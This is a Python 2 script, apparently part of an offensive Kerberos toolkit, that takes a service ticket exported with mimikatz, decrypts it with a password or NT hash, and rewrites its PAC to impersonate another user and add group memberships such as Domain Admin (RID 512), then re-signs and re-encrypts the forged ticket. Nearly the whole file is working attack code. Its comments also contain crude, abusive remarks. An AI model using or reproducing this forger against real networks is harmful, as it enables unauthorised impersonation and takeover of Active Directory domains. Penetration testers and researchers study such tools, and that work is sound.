#!/usr/local/bin/python2 -tt

import kerberos
from pyasn1.codec.ber import encoder, decoder
from pyasn1.type import univ, useful
import struct
import datetime
import re
import PAC


def walk(t):
	if type(t) == str:
		print 'String: %s' % t
	else:
		print 'Length: %i' % len(t)
		for i in range(len(t)):
			print '---%i---' % i
			print t[i]


#Sequence().setComponentByPosition(0, BitString("'01000000101000010000000000000000'B")).setComponentByPosition(1, Sequence().setComponentByPosition(0, Integer(23)).setComponentByPosition(1, OctetString(hexValue='dfa121845d72f43271bbb33cd9e69443'))).setComponentByPosition(2, GeneralString('MEDIN.LOCAL')).setComponentByPosition(3, Sequence().setComponentByPosition(0, Integer(1)).setComponentByPosition(1, Sequence().setComponentByPosition(0, GeneralString('tm')))).setComponentByPosition(4, Sequence().setComponentByPosition(0, Integer(1)).setComponentByPosition(1, OctetString(''))).setComponentByPosition(5, GeneralizedTime('20140403172846Z')).setComponentByPosition(6, GeneralizedTime('20140403173119Z'))
def updatetimestampsserverticket(ticket, authtime=None, starttime=None, endtime=None, renewtiltime=None):
	now = datetime.datetime.now()
	# yes, this regex isn't perfect, but neither are you
	if not authtime or not re.match(r'^20\d\d[0-1]\d[0-3]\d[0-2]\d[0-6]\d[0-6]\dZ$', authtime):
		authtime = now.strftime('%Y%m%d%H%M%SZ')
	if not starttime or not re.match(r'^20\d\d[0-1]\d[0-3]\d[0-2]\d[0-6]\d[0-6]\dZ$', starttime):
		starttime = now.strftime('%Y%m%d%H%M%SZ')
	if not endtime or not re.match(r'^20\d\d[0-1]\d[0-3]\d[0-2]\d[0-6]\d[0-6]\dZ$', endtime):
		endtime = (now + datetime.timedelta(hours=10)).strftime('%Y%m%d%H%M%SZ')
	if not renewtiltime or not re.match(r'^20\d\d[0-1]\d[0-3]\d[0-2]\d[0-6]\d[0-6]\dZ$', renewtiltime):
		renewtiltime = (now + datetime.timedelta(hours=24)).strftime('%Y%m%d%H%M%SZ')

	# Dear, pyasn1 
	# Why do I have to use a _ method to update a value. You expect me to write
	# an entire spec, I don't want to. Because of this I HATE YOU. Please
	# DIAF
	#  -Tim
	# P.S. Suck it
	ticket.getComponentByPosition(5)._value = useful.GeneralizedTime(authtime)
	ticket.getComponentByPosition(6)._value = useful.GeneralizedTime(starttime)
	ticket.getComponentByPosition(7)._value = useful.GeneralizedTime(endtime)
	ticket.getComponentByPosition(8)._value = useful.GeneralizedTime(renewtiltime)

	return ticket

def addgrouptopac(pac, grouprid):
	version, numentries, pactype, pacsize, offset = struct.unpack('<IIIII', pac[:20])
	pac_logon_info = pac[offset:offset+pacsize]
	return pac

def updateusernameinencpart(key, rawticket, username, debug=False, verbose=False):
	try:
		ramticket, extra = decoder.decode(rawticket)
		serverticket = ramticket.getComponentByPosition(2)
		localticket = ramticket.getComponentByPosition(3)
		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
	except:
		raise ValueError('Unable to decode ticket. Invalid file.')
	if verbose: print 'Ticket succesfully decoded'

	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)

	a = decoder.decode(decserverticketraw)[0]
	a[3][1][0]._value = username
	e = encoder.encode(a)


	newencserverticket = kerberos.encrypt(key, 2, e, nonce)


	ramticket.getComponentByPosition(2).getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2)._value = newencserverticket


	return ramticket



def getpac(key, rawticket, debug=False, verbose=False):
	# attempt decoding of ticket
	try:
		ramticket, extra = decoder.decode(rawticket)
		serverticket = ramticket.getComponentByPosition(2)
		localticket = ramticket.getComponentByPosition(3)
		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
	except:
		raise ValueError('Unable to decode ticket. Invalid file.')
	if verbose: print 'Ticket succesfully decoded'

	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)

	if decserverticketraw == None:
		raise ValueError('Unable to decrypt ticket. Invalid key.')
	elif verbose:
		print 'Decryption successful'

	
	decserverticket, extra = decoder.decode(decserverticketraw)
	# have two here because I was using one to verify that the rewrite matched
	# This stuff should be removed, if it is still here Tim forgot...again
	origdecserverticket, extra = decoder.decode(decserverticketraw)

	# change the validity times in the server ticket
	updatetimestampsserverticket(decserverticket, str(decserverticket[5]), str(decserverticket[6]), str(decserverticket[7]), str(decserverticket[8]))

	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
	pac = str(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))

	return pac

def updatepac(key, rawticket, pac, debug=False, verbose=False):
	# attempt decoding of ticket
	try:
		ramticket, extra = decoder.decode(rawticket)
		serverticket = ramticket.getComponentByPosition(2)
		localticket = ramticket.getComponentByPosition(3)
		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
	except:
		raise ValueError('Unable to decode ticket. Invalid file.')
	if verbose: print 'Ticket succesfully decoded'

	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)

	if decserverticketraw == None:
		raise ValueError('Unable to decrypt ticket. Invalid key.')
	elif verbose:
		print 'Decryption successful'

	
	decserverticket, extra = decoder.decode(decserverticketraw)

	#for i in range(len(decserverticket[3])):
	#	print '---%i---' % i
	#	print decserverticket[3][i]

	# have two here because I was using one to verify that the rewrite matched
	# This stuff should be removed, if it is still here Tim forgot...again
	origdecserverticket, extra = decoder.decode(decserverticketraw)

	# change the validity times in the server ticket
	updatetimestampsserverticket(decserverticket, str(decserverticket[5]), str(decserverticket[6]), str(decserverticket[7]), str(decserverticket[8]))

	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])


	chksum = kerberos.chksum(key, '\x11\x00\x00\x00', pac)
	#print 'newchecksum:  %s' %  chksum.encode('hex')

	# repair server checksum
	newpac = pac[:-44] + chksum + pac[-28:]
	# rebuild AD-IF-RELEVANT
	#print adifrelevant
	#print dir(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))
	adifrelevant.getComponentByPosition(0).getComponentByPosition(1)._value = newpac
	#print adifrelevant
	decserverticket.getComponentByPosition(9).getComponentByPosition(0).getComponentByPosition(1)._value = encoder.encode(adifrelevant)


	# put the ticket back together again
	newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)
	ramticket.getComponentByPosition(2).getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2)._value = newencserverticket

	#print decserverticket

	return encoder.encode(ramticket)



if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Read kerberos ticket then modify it')
	parser.add_argument('-r', '--readfile', dest='infile', action='store', required=True, 
					metavar='INFILE.kirbi', type=argparse.FileType('rb'), 
					help='the file containing the kerberos ticket exported with mimikatz')
	parser.add_argument('-w', '--outputfile', dest='outfile', action='store', required=True, 
					metavar='OUTFILE.kirbi', type=argparse.FileType('wb'), 
					help='the output file, wite hash for john the ripper to crack')
	parser.add_argument('-p', '--password', dest='password', action='store', required=False, 
					metavar='P@ss0rd1', type=str, 
					help='the password used to decrypt/encrypt the ticket')
	parser.add_argument('-t', '--nthash', dest='nthash', action='store', required=False, 
					metavar='64F12CDDAA88057E06A81B54E73B949B', type=str, 
					help='the hashed password used to decrypt/encrypt the ticket')
	parser.add_argument('-g', '--group', dest='groups', action='append', required=False, 
					metavar='512', type=int, 
					help='group rid to add (512 is Domain Admin)')
	parser.add_argument('-u', '--user', dest='userrid', action='store', required=False, 
					metavar='500', type=int, 
					help='user rid to impersonate')
	parser.add_argument('-n', '--username', dest='username', action='store', required=False, 
					metavar='yomom', type=str, 
					help='user name to impersonate')
	parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', required=False, 
					default=False,
					help='verbose')
	parser.add_argument('-d', '--debug', dest='debug', action='store_true', required=False, 
					default=False,
					help='show debug messages')
	#parser.add_argument('-t', '--enctype', dest='enctype', action='store', required=False, default=2, 
	#				metavar='2', type=int, 
	#				help='message type, from RAM it is 2 (This should not need to be changed)')


	args = parser.parse_args()

	# make sure a password or hash is provided
	if args.nthash == None and args.password != None:
		key = kerberos.ntlmhash(args.password)
	elif args.nthash != None:
		key = args.nthash.decode('hex')
	else:
		print "You must provide either the password (-p) or the hash (-n)"
		exit(1)

	# read the ticket from the file
	fullraw = args.infile.read()
	args.infile.close()

	# do the rewrite
	#newticket = rewriteticket(key, fullraw,  debug=args.debug, verbose=args.verbose)

	pac = getpac(key, fullraw)
	pacobj = PAC.PAC(pac)

	# change user rid
	if args.userrid:
		pacobj.PacLoginInfo.UserRid = args.userrid

	# append groups
	if args.groups:
		for g in args.groups:
			if g not in pacobj.PacLoginInfo.Groups:
				pacobj.PacLoginInfo.Groups.append(g)

	if args.username:
		pacobj.PacLoginInfo.AccountName = args.username.encode('utf-16le')
		pacobj.PacLoginInfo.DisplayName = args.username.encode('utf-16le')
		

	pac = pacobj.encode()
	newticket = updatepac(key, fullraw, pac)

	if args.username:
		updateusernameinencpart(key, newticket, args.username)


	args.outfile.write(newticket)
	args.outfile.close()





